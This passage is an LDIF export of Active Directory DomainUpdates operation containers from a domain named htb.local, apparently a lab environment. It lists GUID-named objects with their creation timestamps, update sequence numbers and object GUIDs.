# 6bcd5684-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd5684-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd5684-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5684-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5981
uSNChanged: 94721
showInAdvancedViewOnly: TRUE
name: 6bcd5684-8314-11d6-977b-00c04f613221
objectGUID:: QJ0BtJJ/lU6Hykr0snPpdw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd5685-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd5685-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd5685-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5685-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5982
uSNChanged: 94724
showInAdvancedViewOnly: TRUE
name: 6bcd5685-8314-11d6-977b-00c04f613221
objectGUID:: Rx6IP0TlIkGqkUlicZaGAw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd5686-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd5686-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd5686-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5686-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5983
uSNChanged: 94727
showInAdvancedViewOnly: TRUE
name: 6bcd5686-8314-11d6-977b-00c04f613221
objectGUID:: Pkhcq8E48U6uxDPDzh/VGw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd5687-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd5687-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd5687-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5687-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5984
uSNChanged: 94730
showInAdvancedViewOnly: TRUE
name: 6bcd5687-8314-11d6-977b-00c04f613221
objectGUID:: tqeYFi1BS0mFFb7e7wUPUA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd5688-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd5688-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd5688-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5688-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5985
uSNChanged: 94733
showInAdvancedViewOnly: TRUE
name: 6bcd5688-8314-11d6-977b-00c04f613221
objectGUID:: u7OPjvPvPEe43LnLbEgcRw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd5689-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd5689-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd5689-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5689-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5986
uSNChanged: 94736
showInAdvancedViewOnly: TRUE
name: 6bcd5689-8314-11d6-977b-00c04f613221
objectGUID:: T5hP7ATKRk6Dk4c1fVaQOw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd568a-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd568a-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd568a-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568a-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5987
uSNChanged: 94739
showInAdvancedViewOnly: TRUE
name: 6bcd568a-8314-11d6-977b-00c04f613221
objectGUID:: h3TYpS25k0K8BbOrZh1xIQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd568b-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd568b-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd568b-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568b-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5988
uSNChanged: 94742
showInAdvancedViewOnly: TRUE
name: 6bcd568b-8314-11d6-977b-00c04f613221
objectGUID:: 7+J8jsO/nEOovKfrAPv3PQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd568c-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd568c-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd568c-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568c-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5989
uSNChanged: 94745
showInAdvancedViewOnly: TRUE
name: 6bcd568c-8314-11d6-977b-00c04f613221
objectGUID:: HGzg+a3iJ06EIO+nOhrJgA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6bcd568d-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=6bcd568d-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6bcd568d-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568d-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5990
uSNChanged: 94748
showInAdvancedViewOnly: TRUE
name: 6bcd568d-8314-11d6-977b-00c04f613221
objectGUID:: JCroD3SwXEuXOKVZu4PYiA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c, Operations, DomainUpdates, System, htb.
 local
dn: CN=3051c66f-b332-4a73-9a20-2d6a7d6e6a1c,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
distinguishedName: CN=3051c66f-b332-4a73-9a20-2d6a7d6e6a1c,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5991
uSNChanged: 94751
showInAdvancedViewOnly: TRUE
name: 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
objectGUID:: Wijips2unkaAiBPsBgpMwQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 3e4f4182-ac5d-4378-b760-0eab2de593e2, Operations, DomainUpdates, System, htb.
 local
dn: CN=3e4f4182-ac5d-4378-b760-0eab2de593e2,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 3e4f4182-ac5d-4378-b760-0eab2de593e2
distinguishedName: CN=3e4f4182-ac5d-4378-b760-0eab2de593e2,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5992
uSNChanged: 94754
showInAdvancedViewOnly: TRUE
name: 3e4f4182-ac5d-4378-b760-0eab2de593e2
objectGUID:: ZFeR7uZon0O05OGCBXYo+Q==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# c4f17608-e611-11d6-9793-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=c4f17608-e611-11d6-9793-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: c4f17608-e611-11d6-9793-00c04f613221
distinguishedName: CN=c4f17608-e611-11d6-9793-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5993
uSNChanged: 94757
showInAdvancedViewOnly: TRUE
name: c4f17608-e611-11d6-9793-00c04f613221
objectGUID:: q1G5Ge4NEkOWhVYSittmVQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 13d15cf0-e6c8-11d6-9793-00c04f613221, Operations, DomainUpdates, System, htb.
 local
dn: CN=13d15cf0-e6c8-11d6-9793-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 13d15cf0-e6c8-11d6-9793-00c04f613221
distinguishedName: CN=13d15cf0-e6c8-11d6-9793-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5994
uSNChanged: 94760
showInAdvancedViewOnly: TRUE
name: 13d15cf0-e6c8-11d6-9793-00c04f613221
objectGUID:: sbXrpUlheU6FylbMCV87Pg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c, Operations, DomainUpdates, System, htb.
 local
dn: CN=8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
distinguishedName: CN=8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5995
uSNChanged: 94763
showInAdvancedViewOnly: TRUE
name: 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
objectGUID:: 33Zcn7y/eku6Zdr5wtg3WQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# dda1d01d-4bd7-4c49-a184-46f9241b560e, Operations, DomainUpdates, System, htb.
 local
dn: CN=dda1d01d-4bd7-4c49-a184-46f9241b560e,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: dda1d01d-4bd7-4c49-a184-46f9241b560e
distinguishedName: CN=dda1d01d-4bd7-4c49-a184-46f9241b560e,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5996
uSNChanged: 94766
showInAdvancedViewOnly: TRUE
name: dda1d01d-4bd7-4c49-a184-46f9241b560e
objectGUID:: A57wpnOMhk6uoVrWU0xDzQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# a1789bfb-e0a2-4739-8cc0-e77d892d080a, Operations, DomainUpdates, System, htb.
 local
dn: CN=a1789bfb-e0a2-4739-8cc0-e77d892d080a,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: a1789bfb-e0a2-4739-8cc0-e77d892d080a
distinguishedName: CN=a1789bfb-e0a2-4739-8cc0-e77d892d080a,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5997
uSNChanged: 94769
showInAdvancedViewOnly: TRUE
name: a1789bfb-e0a2-4739-8cc0-e77d892d080a
objectGUID:: iLstgxuJX0O7xOGLkBY7nA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 61b34cb0-55ee-4be9-b595-97810b92b017, Operations, DomainUpdates, System, htb.
 local
dn: CN=61b34cb0-55ee-4be9-b595-97810b92b017,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 61b34cb0-55ee-4be9-b595-97810b92b017
distinguishedName: CN=61b34cb0-55ee-4be9-b595-97810b92b017,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5998
uSNChanged: 94772
showInAdvancedViewOnly: TRUE
name: 61b34cb0-55ee-4be9-b595-97810b92b017
objectGUID:: aCyzr3opdEKq5KQJwSLRsw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 57428d75-bef7-43e1-938b-2e749f5a8d56, Operations, DomainUpdates, System, htb.
 local
dn: CN=57428d75-bef7-43e1-938b-2e749f5a8d56,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 57428d75-bef7-43e1-938b-2e749f5a8d56
distinguishedName: CN=57428d75-bef7-43e1-938b-2e749f5a8d56,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 5999
uSNChanged: 94775
showInAdvancedViewOnly: TRUE
name: 57428d75-bef7-43e1-938b-2e749f5a8d56
objectGUID:: 7rQDEG5zRkWgcZbCoBIjaw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# ebad865a-d649-416f-9922-456b53bbb5b8, Operations, DomainUpdates, System, htb.
 local
dn: CN=ebad865a-d649-416f-9922-456b53bbb5b8,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ebad865a-d649-416f-9922-456b53bbb5b8
distinguishedName: CN=ebad865a-d649-416f-9922-456b53bbb5b8,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6000
uSNChanged: 94778
showInAdvancedViewOnly: TRUE
name: ebad865a-d649-416f-9922-456b53bbb5b8
objectGUID:: rH0IS4bogUy7OAQ6ntcVmw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 0b7fb422-3609-4587-8c2e-94b10f67d1bf, Operations, DomainUpdates, System, htb.
 local
dn: CN=0b7fb422-3609-4587-8c2e-94b10f67d1bf,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 0b7fb422-3609-4587-8c2e-94b10f67d1bf
distinguishedName: CN=0b7fb422-3609-4587-8c2e-94b10f67d1bf,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6001
uSNChanged: 94781
showInAdvancedViewOnly: TRUE
name: 0b7fb422-3609-4587-8c2e-94b10f67d1bf
objectGUID:: 7LtxK/dnoEWWRdAka7o40g==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 2951353e-d102-4ea5-906c-54247eeec741, Operations, DomainUpdates, System, htb.
 local
dn: CN=2951353e-d102-4ea5-906c-54247eeec741,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 2951353e-d102-4ea5-906c-54247eeec741
distinguishedName: CN=2951353e-d102-4ea5-906c-54247eeec741,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6002
uSNChanged: 94784
showInAdvancedViewOnly: TRUE
name: 2951353e-d102-4ea5-906c-54247eeec741
objectGUID:: fYrKD/2Uvkm3tVjvZqfepQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 71482d49-8870-4cb3-a438-b6fc9ec35d70, Operations, DomainUpdates, System, htb.
 local
dn: CN=71482d49-8870-4cb3-a438-b6fc9ec35d70,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 71482d49-8870-4cb3-a438-b6fc9ec35d70
distinguishedName: CN=71482d49-8870-4cb3-a438-b6fc9ec35d70,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6003
uSNChanged: 94787
showInAdvancedViewOnly: TRUE
name: 71482d49-8870-4cb3-a438-b6fc9ec35d70
objectGUID:: uxq/0fMu00a73HiUk0z1SA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# aed72870-bf16-4788-8ac7-22299c8207f1, Operations, DomainUpdates, System, htb.
 local
dn: CN=aed72870-bf16-4788-8ac7-22299c8207f1,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: aed72870-bf16-4788-8ac7-22299c8207f1
distinguishedName: CN=aed72870-bf16-4788-8ac7-22299c8207f1,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6004
uSNChanged: 94790
showInAdvancedViewOnly: TRUE
name: aed72870-bf16-4788-8ac7-22299c8207f1
objectGUID:: F5oBBjlozE2YMUfv+J7uqA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# f58300d1-b71a-4DB6-88a1-a8b9538beaca, Operations, DomainUpdates, System, htb.
 local
dn: CN=f58300d1-b71a-4DB6-88a1-a8b9538beaca,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: f58300d1-b71a-4DB6-88a1-a8b9538beaca
distinguishedName: CN=f58300d1-b71a-4DB6-88a1-a8b9538beaca,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6005
uSNChanged: 94793
showInAdvancedViewOnly: TRUE
name: f58300d1-b71a-4DB6-88a1-a8b9538beaca
objectGUID:: IQwBsmjkgUenKf7FFc0wwQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 231fb90b-c92a-40c9-9379-bacfc313a3e3, Operations, DomainUpdates, System, htb.
 local
dn: CN=231fb90b-c92a-40c9-9379-bacfc313a3e3,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 231fb90b-c92a-40c9-9379-bacfc313a3e3
distinguishedName: CN=231fb90b-c92a-40c9-9379-bacfc313a3e3,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6006
uSNChanged: 94796
showInAdvancedViewOnly: TRUE
name: 231fb90b-c92a-40c9-9379-bacfc313a3e3
objectGUID:: L7ZOwIunSkKF4hzgzSmnsg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0, Operations, DomainUpdates, System, htb.
 local
dn: CN=4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
distinguishedName: CN=4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6007
uSNChanged: 94799
showInAdvancedViewOnly: TRUE
name: 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
objectGUID:: 7nes9JuFbUODALMA6jNmiw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 9738c400-7795-4d6e-b19d-c16cd6486166, Operations, DomainUpdates, System, htb.
 local
dn: CN=9738c400-7795-4d6e-b19d-c16cd6486166,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 9738c400-7795-4d6e-b19d-c16cd6486166
distinguishedName: CN=9738c400-7795-4d6e-b19d-c16cd6486166,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6008
uSNChanged: 94802
showInAdvancedViewOnly: TRUE
name: 9738c400-7795-4d6e-b19d-c16cd6486166
objectGUID:: KYEiXR1VgUaLNqOMuqCcxQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# de10d491-909f-4fb0-9abb-4b7865c0fe80, Operations, DomainUpdates, System, htb.
 local
dn: CN=de10d491-909f-4fb0-9abb-4b7865c0fe80,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: de10d491-909f-4fb0-9abb-4b7865c0fe80
distinguishedName: CN=de10d491-909f-4fb0-9abb-4b7865c0fe80,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6009
uSNChanged: 94805
showInAdvancedViewOnly: TRUE
name: de10d491-909f-4fb0-9abb-4b7865c0fe80
objectGUID:: nvQXAbAQJk2QVko+9x9mrg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
